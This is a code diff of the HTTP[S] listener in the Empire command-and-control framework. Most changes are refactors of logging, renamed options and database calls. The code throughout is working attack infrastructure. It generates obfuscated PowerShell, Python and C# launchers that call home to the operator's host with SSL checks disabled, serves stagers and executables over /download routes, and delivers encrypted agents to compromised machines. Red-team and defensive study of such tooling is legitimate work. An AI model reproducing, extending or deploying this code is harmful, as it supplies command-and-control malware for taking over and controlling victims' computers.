@@ -1,39 +1,48 @@
-from __future__ import print_function
-
 import base64
 import copy
-import json
 import logging
 import os
 import random
 import ssl
 import sys
 import time
-from builtins import object, str
+from builtins import str
 from textwrap import dedent
-from typing import List
+from typing import List, Optional, Tuple
 
 from flask import Flask, make_response, render_template, request, send_from_directory
-from pydispatch import dispatcher
 from werkzeug.serving import WSGIRequestHandler
 
 from empire.server.common import encryption, helpers, packets, templating
-from empire.server.database import models
-from empire.server.database.base import Session
-from empire.server.utils import data_util, listener_util
+from empire.server.common.empire import MainMenu
+from empire.server.core.db import models
+from empire.server.core.db.base import SessionLocal
+from empire.server.utils import data_util, listener_util, log_util
+from empire.server.utils.module_util import handle_validate_message
+
+LOG_NAME_PREFIX = __name__
+log = logging.getLogger(__name__)
 
 
 class Listener(object):
-    def __init__(self, mainMenu, params=[]):
-
+    def __init__(self, mainMenu: MainMenu, params=[]):
         self.info = {
             "Name": "HTTP[S]",
-            "Author": ["@harmj0y"],
+            "Authors": [
+                {
+                    "Name": "Will Schroeder",
+                    "Handle": "@harmj0y",
+                    "Link": "https://twitter.com/harmj0y",
+                }
+            ],
             "Description": (
                 "Starts a http[s] listener (PowerShell or Python) that uses a GET/POST approach."
             ),
-            "Category": ("client_server"),
+            "Category": "client_server",
             "Comments": [],
+            "Software": "",
+            "Techniques": [],
+            "Tactics": [],
         }
 
         # any options needed by the stager, settable during runtime
@@ -168,10 +177,13 @@ class Listener(object):
         )
 
         self.session_cookie = ""
+        self.template_dir = self.mainMenu.installPath + "/data/listeners/templates/"
 
         # check if the current session cookie not empty and then generate random cookie
         if self.session_cookie == "":
             self.options["Cookie"]["Value"] = listener_util.generate_cookie()
+
+        self.instance_log = log
 
     def default_response(self):
         """
@@ -179,7 +191,7 @@ class Listener(object):
         """
         return open(f"{self.template_dir }/default.html", "r").read()
 
-    def validate_options(self):
+    def validate_options(self) -> Tuple[bool, Optional[str]]:
         """
         Validate all options for this listener.
         """
@@ -189,27 +201,22 @@ class Listener(object):
             for a in self.options["DefaultProfile"]["Value"].split("|")[0].split(",")
         ]
 
-        for key in self.options:
-            if self.options[key]["Required"] and (
-                str(self.options[key]["Value"]).strip() == ""
-            ):
-                print(helpers.color('[!] Option "%s" is required.' % (key)))
-                return False
-
         # If we've selected an HTTPS listener without specifying CertPath, let us know.
         if (
             self.options["Host"]["Value"].startswith("https")
             and self.options["CertPath"]["Value"] == ""
         ):
-            print(helpers.color("[!] HTTPS selected but no CertPath specified."))
-            return False
-        return True
+            return handle_validate_message(
+                "[!] HTTPS selected but no CertPath specified."
+            )
+
+        return True, None
 
     def generate_launcher(
         self,
         encode=True,
         obfuscate=False,
-        obfuscationCommand="",
+        obfuscation_command="",
         userAgent="default",
         proxy="default",
         proxyCreds="default",
@@ -224,22 +231,20 @@ class Listener(object):
         """
         bypasses = [] if bypasses is None else bypasses
         if not language:
-            print(
-                helpers.color(
-                    "[!] listeners/http generate_launcher(): no language specified!"
-                )
+            log.error(
+                f"{listenerName}: listeners/http generate_launcher(): no language specified!"
             )
+            return None
 
+        # Previously, we had to do a lookup for the listener and check through threads on the instance.
+        # Beginning in 5.0, each instance is unique, so using self should work. This code could probably be simplified
+        # further, but for now keeping as is since 5.0 has enough rewrites as it is.
         if (
-            listenerName
-            and (listenerName in self.threads)
-            and (listenerName in self.mainMenu.listeners.activeListeners)
-        ):
-
+            True
+        ):  # The true check is just here to keep the indentation consistent with the old code.
+            active_listener = self
             # extract the set options for this instantiated listener
-            listenerOptions = self.mainMenu.listeners.activeListeners[listenerName][
-                "options"
-            ]
+            listenerOptions = active_listener.options
             host = listenerOptions["Host"]["Value"]
             launcher = listenerOptions["Launcher"]["Value"]
             staging_key = listenerOptions["StagingKey"]["Value"]
@@ -255,7 +260,7 @@ class Listener(object):
                 listenerOptions["Cookie"]["Value"] = generate
                 cookie = generate
 
-            if language.startswith("po"):
+            if language == "powershell":
                 # PowerShell
                 stager = '$ErrorActionPreference = "SilentlyContinue";'
 
@@ -280,7 +285,7 @@ class Listener(object):
                 stager += f"$ser={ helpers.obfuscate_call_home_address(host) };$t='{ stage0 }';"
 
                 if userAgent.lower() != "none":
-                    stager += f"$wc.Headers.Add('User-Agent',$u);"
+                    stager += "$wc.Headers.Add('User-Agent',$u);"
 
                     if proxy.lower() != "none":
                         if proxy.lower() == "default":
@@ -375,27 +380,26 @@ class Listener(object):
                 stager = data_util.ps_convert_to_oneliner(stager)
 
                 if obfuscate:
-                    stager = data_util.obfuscate(
-                        self.mainMenu.installPath,
+                    stager = self.mainMenu.obfuscationv2.obfuscate(
                         stager,
-                        obfuscationCommand=obfuscationCommand,
+                        obfuscation_command=obfuscation_command,
                     )
                 # base64 encode the stager and return it
                 if encode and (
-                    (not obfuscate) or ("launcher" not in obfuscationCommand.lower())
+                    (not obfuscate) or ("launcher" not in obfuscation_command.lower())
                 ):
                     return helpers.powershell_launcher(stager, launcher)
                 else:
                     # otherwise return the case-randomized stager
                     return stager
 
-            if language.startswith("py"):
+            if language in ["python", "ironpython"]:
                 # Python
                 launcherBase = "import sys;"
                 if "https" in host:
                     # monkey patch ssl woohooo
                     launcherBase += dedent(
-                        f"""
+                        """
                         import ssl;
                         if hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;
                         """
@@ -405,8 +409,8 @@ class Listener(object):
                     if safeChecks.lower() == "true":
                         launcherBase += listener_util.python_safe_checks()
                 except Exception as e:
-                    p = "[!] Error setting LittleSnitch in stager: " + str(e)
-                    print(helpers.color(p, color="red"))
+                    p = f"{listenerName}: Error setting LittleSnitch in stager: {str(e)}"
+                    log.error(p)
 
                 if userAgent.lower() == "default":
                     profile = listenerOptions["DefaultProfile"]["Value"]
@@ -490,7 +494,7 @@ class Listener(object):
                     return launcherBase
 
             # very basic csharp implementation
-            if language.startswith("csh"):
+            if language == "csharp":
                 workingHours = listenerOptions["WorkingHours"]["Value"]
                 killDate = listenerOptions["KillDate"]["Value"]
                 customHeaders = profile.split("|")[2:]  # todo: support custom headers
@@ -514,9 +518,11 @@ class Listener(object):
                     .replace("{{ REPLACE_LOSTLIMIT }}", str(lostLimit))
                 )
 
-                compiler = self.mainMenu.loadedPlugins.get("csharpserver")
+                compiler = self.mainMenu.pluginsv2.get_by_id("csharpserver")
                 if not compiler.status == "ON":
-                    print(helpers.color("[!] csharpserver plugin not running"))
+                    self.instance_log.error(
+                        f"{listenerName} csharpserver plugin not running"
+                    )
                 else:
                     file_name = compiler.do_send_stager(
                         stager_yaml, "Sharpire", confuse=obfuscate
@@ -524,18 +530,9 @@ class Listener(object):
                     return file_name
 
             else:
-                print(
-                    helpers.color(
-                        "[!] listeners/http generate_launcher(): invalid language specification: only 'powershell' and 'python' are currently supported for this module."
-                    )
+                self.instance_log.error(
+                    f"{listenerName}: listeners/http generate_launcher(): invalid language specification: only 'powershell' and 'python' are currently supported for this module."
                 )
-
-        else:
-            print(
-                helpers.color(
-                    "[!] listeners/http generate_launcher(): invalid listener name specification!"
-                )
-            )
 
     def generate_stager(
         self,
@@ -543,18 +540,14 @@ class Listener(object):
         encode=False,
         encrypt=True,
         obfuscate=False,
-        obfuscationCommand="",
+        obfuscation_command="",
         language=None,
     ):
         """
         Generate the stager code needed for communications with this listener.
         """
         if not language:
-            print(
-                helpers.color(
-                    "[!] listeners/http generate_stager(): no language specified!"
-                )
-            )
+            log.error("listeners/http generate_stager(): no language specified!")
             return None
 
         profile = listenerOptions["DefaultProfile"]["Value"]
@@ -591,7 +584,8 @@ class Listener(object):
             stager = template.render(template_options)
 
             # Get the random function name generated at install and patch the stager with the proper function name
-            stager = data_util.keyword_obfuscation(stager)
+            if obfuscate:
+                stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
 
             # make sure the server ends with "/"
             if not host.endswith("/"):
@@ -614,10 +608,8 @@ class Listener(object):
             unobfuscated_stager = listener_util.remove_lines_comments(stager)
 
             if obfuscate:
-                unobfuscated_stager = data_util.obfuscate(
-                    self.mainMenu.installPath,
-                    unobfuscated_stager,
-                    obfuscationCommand=obfuscationCommand,
+                unobfuscated_stager = self.mainMenu.obfuscationv2.obfuscate(
+                    unobfuscated_stager, obfuscation_command=obfuscation_command
                 )
             # base64 encode the stager and return it
             # There doesn't seem to be any conditions in which the encrypt flag isn't set so the other
@@ -668,10 +660,8 @@ class Listener(object):
                 return stager
 
         else:
-            print(
-                helpers.color(
-                    "[!] listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
-                )
+            log.error(
+                "listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
             )
 
     def generate_agent(
@@ -679,7 +669,7 @@ class Listener(object):
         listenerOptions,
         language=None,
         obfuscate=False,
-        obfuscationCommand="",
+        obfuscation_command="",
         version="",
     ):
         """
@@ -687,11 +677,7 @@ class Listener(object):
         """
 
         if not language:
-            print(
-                helpers.color(
-                    "[!] listeners/http generate_agent(): no language specified!"
-                )
-            )
+            log.error("listeners/http generate_agent(): no language specified!")
             return None
 
         language = language.lower()
@@ -704,12 +690,12 @@ class Listener(object):
         b64DefaultResponse = base64.b64encode(self.default_response().encode("UTF-8"))
 
         if language == "powershell":
-
             with open(self.mainMenu.installPath + "/data/agent/agent.ps1") as f:
                 code = f.read()
 
-            # Get the random function name generated at install and patch the stager with the proper function name
-            code = data_util.keyword_obfuscation(code)
+            if obfuscate:
+                # Get the random function name generated at install and patch the stager with the proper function name
+                code = self.mainMenu.obfuscationv2.obfuscate_keywords(code)
 
             # strip out comments and blank lines
             code = helpers.strip_powershell_comments(code)
@@ -731,10 +717,9 @@ class Listener(object):
             if killDate != "":
                 code = code.replace("$KillDate,", f"$KillDate = '{ killDate }',")
             if obfuscate:
-                code = data_util.obfuscate(
-                    self.mainMenu.installPath,
+                code = self.mainMenu.obfuscationv2.obfuscate(
                     code,
-                    obfuscationCommand=obfuscationCommand,
+                    obfuscation_command=obfuscation_command,
                 )
             return code
 
@@ -779,10 +764,8 @@ class Listener(object):
             code = ""
             return code
         else:
-            print(
-                helpers.color(
-                    "[!] listeners/http generate_agent(): invalid language specification, only 'powershell', 'python', & 'csharp' are currently supported for this module."
-                )
+            log.error(
+                "listeners/http generate_agent(): invalid language specification, only 'powershell', 'python', & 'csharp' are currently supported for this module."
             )
 
     def generate_comms(self, listenerOptions, language=None):
@@ -801,7 +784,7 @@ class Listener(object):
                 ]
 
                 eng = templating.TemplateEngine(template_path)
-                template = eng.get_template("http/http.ps1")
+                template = eng.get_template("http/comms.ps1")
 
                 template_options = {
                     "session_cookie": self.session_cookie,
@@ -828,40 +811,42 @@ class Listener(object):
                 return comms
 
             else:
-                print(
-                    helpers.color(
-                        "[!] listeners/http generate_comms(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
-                    )
+                log.error(
+                    "listeners/http generate_comms(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
                 )
         else:
-            print(
-                helpers.color(
-                    "[!] listeners/http generate_comms(): no language specified!"
-                )
-            )
+            log.error("listeners/http generate_comms(): no language specified!")
 
     def start_server(self, listenerOptions):
         """
         Threaded function that actually starts up the Flask server.
         """
+        # TODO VR Since name is editable, we should probably use the listener's id here.
+        #  But its not available until we do some refactoring. For now, we'll just use the name.
+        self.instance_log = log_util.get_listener_logger(
+            LOG_NAME_PREFIX, self.options["Name"]["Value"]
+        )
 
         # make a copy of the currently set listener options for later stager/agent generation
         listenerOptions = copy.deepcopy(listenerOptions)
 
         # suppress the normal Flask output
-        log = logging.getLogger("werkzeug")
-        log.setLevel(logging.ERROR)
+        werkzeug_log = logging.getLogger("werkzeug")
+        werkzeug_log.setLevel(logging.ERROR)
 
         bindIP = listenerOptions["BindIP"]["Value"]
         port = listenerOptions["Port"]["Value"]
         stagingKey = listenerOptions["StagingKey"]["Value"]
-        stagerURI = listenerOptions["StagerURI"]["Value"]
         userAgent = listenerOptions["UserAgent"]["Value"]
         listenerName = listenerOptions["Name"]["Value"]
         proxy = listenerOptions["Proxy"]["Value"]
         proxyCreds = listenerOptions["ProxyCreds"]["Value"]
 
-        self.template_dir = self.mainMenu.installPath + "/data/listeners/templates/"
+        if "pytest" in sys.modules:
+            # Let's not start the server if we're running tests.
+            while True:
+                time.sleep(1)
+
         app = Flask(__name__, template_folder=self.template_dir)
         self.app = app
 
@@ -871,7 +856,7 @@ class Listener(object):
         @app.route("/download/<stager>/")
         @app.route("/download/<stager>/<options>")
         def send_stager(stager, options=None):
-            if "po" in stager:
+            if "powershell" == stager:
                 if options:
                     options = base64.b64decode(options).decode("UTF-8")
                     options = options.split(":")
@@ -895,7 +880,7 @@ class Listener(object):
                         proxy=proxy,
                         proxyCreds=proxyCreds,
                         obfuscate=obfuscate,
-                        obfuscationCommand=obfuscate_command,
+                        obfuscation_command=obfuscate_command,
                         bypasses=bypasses,
                     )
                     return launcher
@@ -911,7 +896,7 @@ class Listener(object):
                     )
                     return launcher
 
-            elif "py" in stager:
+            elif "python" == stager:
                 launcher = self.mainMenu.stagers.generate_launcher(
                     listenerName,
                     language="python",
@@ -922,6 +907,36 @@ class Listener(object):
                 )
                 return launcher
 
+            elif "ironpython" == stager:
+                launcher = self.mainMenu.stagers.generate_launcher(
+                    listenerName,
+                    language="python",
+                    encode=False,
+                    userAgent=userAgent,
+                    proxy=proxy,
+                    proxyCreds=proxyCreds,
+                )
+
+                directory = self.mainMenu.stagers.generate_python_exe(
+                    launcher, dot_net_version="net40"
+                )
+                with open(directory, "rb") as f:
+                    code = f.read()
+                return code
+
+            elif "csharp" == stager:
+                filename = self.mainMenu.stagers.generate_launcher(
+                    listenerName,
+                    language="csharp",
+                    encode=False,
+                    userAgent=userAgent,
+                    proxy=proxy,
+                    proxyCreds=proxyCreds,
+                )
+                directory = f"{self.mainMenu.installPath}/csharp/Covenant/Data/Tasks/CSharp/Compiled/net35/{filename}.exe"
+                with open(directory, "rb") as f:
+                    code = f.read()
+                return code
             else:
                 return make_response(self.default_response(), 404)
 
@@ -932,11 +947,8 @@ class Listener(object):
             """
             if not self.mainMenu.agents.is_ip_allowed(request.remote_addr):
                 listenerName = self.options["Name"]["Value"]
-                message = "[!] {} on the blacklist/not on the whitelist requested resource".format(
-                    request.remote_addr
-                )
-                signal = json.dumps({"print": True, "message": message})
-                dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
+                message = f"{listenerName}: {request.remote_addr} on the blacklist/not on the whitelist requested resource"
+                self.instance_log.info(message)
                 return make_response(self.default_response(), 404)
 
         @app.after_request
@@ -993,11 +1005,8 @@ class Listener(object):
             clientIP = request.remote_addr
 
             listenerName = self.options["Name"]["Value"]
-            message = "[*] GET request for {}/{} from {}".format(
-                request.host, request_uri, clientIP
-            )
-            signal = json.dumps({"print": False, "message": message})
-            dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
+            message = f"{listenerName}: GET request for {request.host}/{request_uri} from {clientIP}"
+            self.instance_log.info(message)
 
             routingPacket = None
             cookie = request.headers.get("Cookie")
@@ -1008,20 +1017,15 @@ class Listener(object):
                     # NOTE: this can be easily moved to a paramter, another cookie value, etc.
                     if self.session_cookie in cookie:
                         listenerName = self.options["Name"]["Value"]
-                        message = "[*] GET cookie value from {} : {}".format(
-                            clientIP, cookie
-                        )
-                        signal = json.dumps({"print": False, "message": message})
-                        dispatcher.send(
-                            signal, sender="listeners/http/{}".format(listenerName)
-                        )
+                        message = f"{listenerName}: GET cookie value from {clientIP} : {cookie}"
+                        self.instance_log.info(message)
                         cookieParts = cookie.split(";")
                         for part in cookieParts:
                             if part.startswith(self.session_cookie):
                                 base64RoutingPacket = part[part.find("=") + 1 :]
                                 # decode the routing packet base64 value in the cookie
                                 routingPacket = base64.b64decode(base64RoutingPacket)
-                except Exception as e:
+                except Exception:
                     routingPacket = None
                     pass
 
@@ -1032,50 +1036,42 @@ class Listener(object):
                     stagingKey, routingPacket, listenerOptions, clientIP
                 )
                 if dataResults and len(dataResults) > 0:
-                    for (language, results) in dataResults:
+                    for language, results in dataResults:
                         if results:
                             if isinstance(results, str):
                                 results = results.encode("UTF-8")
                             if results == b"STAGE0":
                                 # handle_agent_data() signals that the listener should return the stager.ps1 code
                                 # step 2 of negotiation -> return stager.ps1 (stage 1)
-                                listenerName = self.options["Name"]["Value"]
-                                message = (
-                                    "[*] Sending {} stager (stage 1) to {}".format(
-                                        language, clientIP
+                                message = f"{listenerName}: Sending {language} stager (stage 1) to {clientIP}"
+                                self.instance_log.info(message)
+                                log.info(message)
+
+                                with SessionLocal() as db:
+                                    obf_config = self.mainMenu.obfuscationv2.get_obfuscation_config(
+                                        db, language
                                     )
-                                )
-                                signal = json.dumps({"print": True, "message": message})
-                                dispatcher.send(
-                                    signal,
-                                    sender="listeners/http/{}".format(listenerName),
-                                )
-                                stage = self.generate_stager(
-                                    language=language,
-                                    listenerOptions=listenerOptions,
-                                    obfuscate=self.mainMenu.obfuscate,
-                                    obfuscationCommand=self.mainMenu.obfuscateCommand,
-                                )
+                                    stage = self.generate_stager(
+                                        language=language,
+                                        listenerOptions=listenerOptions,
+                                        obfuscate=False
+                                        if not obf_config
+                                        else obf_config.enabled,
+                                        obfuscation_command=""
+                                        if not obf_config
+                                        else obf_config.command,
+                                    )
                                 return make_response(stage, 200)
 
                             elif results.startswith(b"ERROR:"):
                                 listenerName = self.options["Name"]["Value"]
-                                message = "[!] Error from agents.handle_agent_data() for {} from {}: {}".format(
-                                    request_uri, clientIP, results
-                                )
-                                signal = json.dumps({"print": True, "message": message})
-                                dispatcher.send(
-                                    signal,
-                                    sender="listeners/http/{}".format(listenerName),
-                                )
+                                message = f"{listenerName}: Error from agents.handle_agent_data() for {request_uri} from {clientIP}: {results}"
+                                self.instance_log.error(message)
 
                                 if b"not in cache" in results:
                                     # signal the client to restage
-                                    print(
-                                        helpers.color(
-                                            "[*] Orphaned agent from %s, signaling restaging"
-                                            % (clientIP)
-                                        )
+                                    log.info(
+                                        f"{listenerName}: Orphaned agent from {clientIP}, signaling restaging"
                                     )
                                     return make_response(self.default_response(), 401)
                                 else:
@@ -1084,30 +1080,20 @@ class Listener(object):
                             else:
                                 # actual taskings
                                 listenerName = self.options["Name"]["Value"]
-                                message = "[*] Agent from {} retrieved taskings".format(
-                                    clientIP
-                                )
-                                signal = json.dumps(
-                                    {"print": False, "message": message}
-                                )
-                                dispatcher.send(
-                                    signal,
-                                    sender="listeners/http/{}".format(listenerName),
-                                )
+                                message = f"{listenerName}: Agent from {clientIP} retrieved taskings"
+                                self.instance_log.info(message)
                                 return make_response(results, 200)
                         else:
-                            # dispatcher.send("[!] Results are None...", sender='listeners/http')
+                            message = f"{listenerName}: Results are None for {request_uri} from {clientIP}"
+                            self.instance_log.debug(message)
                             return make_response(self.default_response(), 200)
                 else:
                     return make_response(self.default_response(), 200)
 
             else:
                 listenerName = self.options["Name"]["Value"]
-                message = "[!] {} requested by {} with no routing packet.".format(
-                    request_uri, clientIP
-                )
-                signal = json.dumps({"print": True, "message": message})
-                dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
+                message = f"{listenerName}: {request_uri} requested by {clientIP} with no routing packet."
+                self.instance_log.error(message)
                 return make_response(self.default_response(), 404)
 
         @app.route("/<path:request_uri>", methods=["POST"])
@@ -1117,15 +1103,11 @@ class Listener(object):
             """
             stagingKey = listenerOptions["StagingKey"]["Value"]
             clientIP = request.remote_addr
-
             requestData = request.get_data()
 
             listenerName = self.options["Name"]["Value"]
-            message = "[*] POST request data length from {} : {}".format(
-                clientIP, len(requestData)
-            )
-            signal = json.dumps({"print": False, "message": message})
-            dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
+            message = f"{listenerName}: POST request data length from {clientIP} : {len(requestData)}"
+            self.instance_log.info(message)
 
             # the routing packet should be at the front of the binary request.data
             #   NOTE: this can also go into a cookie/etc.
@@ -1133,7 +1115,7 @@ class Listener(object):
                 stagingKey, requestData, listenerOptions, clientIP
             )
             if dataResults and len(dataResults) > 0:
-                for (language, results) in dataResults:
+                for language, results in dataResults:
                     if isinstance(results, str):
                         results = results.encode("UTF-8")
 
@@ -1148,13 +1130,9 @@ class Listener(object):
                             ]
 
                             listenerName = self.options["Name"]["Value"]
-                            message = "[*] Sending agent (stage 2) to {} at {}".format(
-                                sessionID, clientIP
-                            )
-                            signal = json.dumps({"print": True, "message": message})
-                            dispatcher.send(
-                                signal, sender="listeners/http/{}".format(listenerName)
-                            )
+                            message = f"{listenerName}: Sending agent (stage 2) to {sessionID} at {clientIP}"
+                            self.instance_log.info(message)
+                            log.info(message)
 
                             hopListenerName = request.headers.get("Hop-Name")
 
@@ -1167,11 +1145,16 @@ class Listener(object):
                                 tempListenerOptions["Host"][
                                     "Value"
                                 ] = hopListener.options["Host"]["Value"]
+                                with SessionLocal.begin() as db:
+                                    db_agent = self.mainMenu.agentsv2.get_by_id(
+                                        db, sessionID
+                                    )
+                                    db_agent.listener = hopListenerName
                             else:
                                 tempListenerOptions = listenerOptions
 
                             session_info = (
-                                Session()
+                                SessionLocal()
                                 .query(models.Agent)
                                 .filter(models.Agent.session_id == sessionID)
                                 .first()
@@ -1182,43 +1165,47 @@ class Listener(object):
                                 version = ""
 
                             # step 6 of negotiation -> server sends patched agent.ps1/agent.py
-                            agentCode = self.generate_agent(
-                                language=language,
-                                listenerOptions=tempListenerOptions,
-                                obfuscate=self.mainMenu.obfuscate,
-                                obfuscationCommand=self.mainMenu.obfuscateCommand,
-                                version=version,
-                            )
-                            encryptedAgent = encryption.aes_encrypt_then_hmac(
-                                sessionKey, agentCode
-                            )
-                            # TODO: wrap ^ in a routing packet?
+                            with SessionLocal() as db:
+                                obf_config = (
+                                    self.mainMenu.obfuscationv2.get_obfuscation_config(
+                                        db, language
+                                    )
+                                )
+                                agentCode = self.generate_agent(
+                                    language=language,
+                                    listenerOptions=tempListenerOptions,
+                                    obfuscate=False
+                                    if not obf_config
+                                    else obf_config.enabled,
+                                    obfuscation_command=""
+                                    if not obf_config
+                                    else obf_config.command,
+                                    version=version,
+                                )
 
-                            return make_response(encryptedAgent, 200)
+                                if language.lower() in ["python", "ironpython"]:
+                                    sessionKey = bytes.fromhex(sessionKey)
+
+                                encryptedAgent = encryption.aes_encrypt_then_hmac(
+                                    sessionKey, agentCode
+                                )
+                                # TODO: wrap ^ in a routing packet?
+
+                                return make_response(encryptedAgent, 200)
 
                         elif results[:10].lower().startswith(b"error") or results[
                             :10
                         ].lower().startswith(b"exception"):
                             listenerName = self.options["Name"]["Value"]
-                            message = (
-                                "[!] Error returned for results by {} : {}".format(
-                                    clientIP, results
-                                )
-                            )
-                            signal = json.dumps({"print": True, "message": message})
-                            dispatcher.send(
-                                signal, sender="listeners/http/{}".format(listenerName)
-                            )
+                            message = f"{listenerName}: Error returned for results by {clientIP} : {results}"
+                            self.instance_log.error(message)
                             return make_response(self.default_response(), 404)
                         elif results.startswith(b"VALID"):
                             listenerName = self.options["Name"]["Value"]
-                            message = "[*] Valid results returned by {}".format(
-                                clientIP
+                            message = (
+                                f"{listenerName}: Valid results returned by {clientIP}"
                             )
-                            signal = json.dumps({"print": False, "message": message})
-                            dispatcher.send(
-                                signal, sender="listeners/http/{}".format(listenerName)
-                            )
+                            self.instance_log.info(message)
                             return make_response(self.default_response(), 200)
                         else:
                             return make_response(results, 200)
@@ -1234,7 +1221,6 @@ class Listener(object):
 
             if certPath.strip() != "" and host.startswith("https"):
                 certPath = os.path.abspath(certPath)
-                pyversion = sys.version_info
 
                 # support any version of tls
                 pyversion = sys.version_info
@@ -1259,13 +1245,11 @@ class Listener(object):
                 app.run(host=bindIP, port=int(port), threaded=True)
 
         except Exception as e:
-            print(
-                helpers.color("[!] Listener startup on port %s failed: %s " % (port, e))
-            )
             listenerName = self.options["Name"]["Value"]
-            message = "[!] Listener startup on port {} failed: {}".format(port, e)
-            signal = json.dumps({"print": True, "message": message})
-            dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
+            log.error(
+                f"{listenerName}: Listener startup on port {port} failed: {e}",
+                exc_info=True,
+            )
 
     def start(self, name=""):
         """
@@ -1296,14 +1280,11 @@ class Listener(object):
         Terminates the server thread stored in the self.threads dictionary,
         keyed by the listener name.
         """
-
         if name and name != "":
-            print(helpers.color("[!] Killing listener '%s'" % (name)))
-            self.threads[name].kill()
+            to_kill = name
         else:
-            print(
-                helpers.color(
-                    "[!] Killing listener '%s'" % (self.options["Name"]["Value"])
-                )
-            )
-            self.threads[self.options["Name"]["Value"]].kill()
+            to_kill = self.options["Name"]["Value"]
+
+        self.instance_log.info(f"{to_kill}: shutting down...")
+        log.info(f"{to_kill}: shutting down...")
+        self.threads[to_kill].kill()
